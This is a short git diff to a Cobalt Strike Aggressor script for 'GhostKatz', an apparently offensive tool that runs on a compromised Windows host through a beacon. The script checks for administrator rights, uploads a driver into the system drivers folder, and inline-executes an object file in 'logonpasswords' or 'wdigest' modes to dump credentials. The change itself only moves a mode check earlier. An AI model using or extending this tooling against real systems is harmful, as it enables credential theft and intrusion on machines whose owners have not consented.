@@ -27,12 +27,18 @@ alias ghostkatz {
 		berror($1, "The current beacon is not running with administrator privileges. Bailing...");
 		return -1;
 	}
-	
+
 	btask($1, "Tasked beacon to inline execute GhostKatz!");
 	$barch = barch($1);
 	$mode = $2;
 	$providerArg = $3;
 	$providerNum = $4;
+
+	if (($mode ne "logonpasswords") && ($mode ne "wdigest"))
+    {
+        berror($1, "Invalid mode: \'$mode\'!");
+        return;
+    }
 
 	$drvBasePath = "C:\\Windows\\System32\\drivers\\"; # WARNING: IF YOU CHANGE THIS, YOU MUST CHANGE utils.c TO REFLECT THE CHANGE OR YOU **WILL** BREAK THINGS
 	if ($providerNum == 1)
@@ -56,12 +62,6 @@ alias ghostkatz {
 		bupload($1, $drvFile);
 		$providerNum = 1;
 	}
-	
-    if (($mode ne "logonpasswords") && ($mode ne "wdigest"))
-    {
-        berror($1, "Invalid mode: \'$mode\'!");
-        return;
-    }
 
 	# Read BOF file
 	$handle = openf(script_resource("bin/ghostkatz. $+ $barch $+ .o"));
